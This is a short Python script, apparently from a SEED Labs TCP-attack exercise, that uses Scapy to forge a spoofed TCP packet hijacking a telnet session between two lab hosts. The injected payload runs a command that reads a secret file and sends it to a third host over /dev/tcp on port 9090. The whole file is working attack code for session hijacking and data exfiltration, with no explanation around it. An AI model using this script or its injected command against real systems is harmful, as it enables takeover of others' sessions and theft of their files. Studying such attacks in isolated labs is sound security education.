#!/usr/bin/python3
import sys
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET.........")

IPLayer = IP(src="10.0.2.4", dst="10.0.2.15")
TCPLayer = TCP(sport=43206, dport=23, flags="A",
               seq=1053955601, ack=1453315298)
Data = "\r cat /home/seed/secret > /dev/tcp/10.0.2.5/9090\r"

pkt = IPLayer/TCPLayer/Data
ls(pkt)

send(pkt,verbose=0)

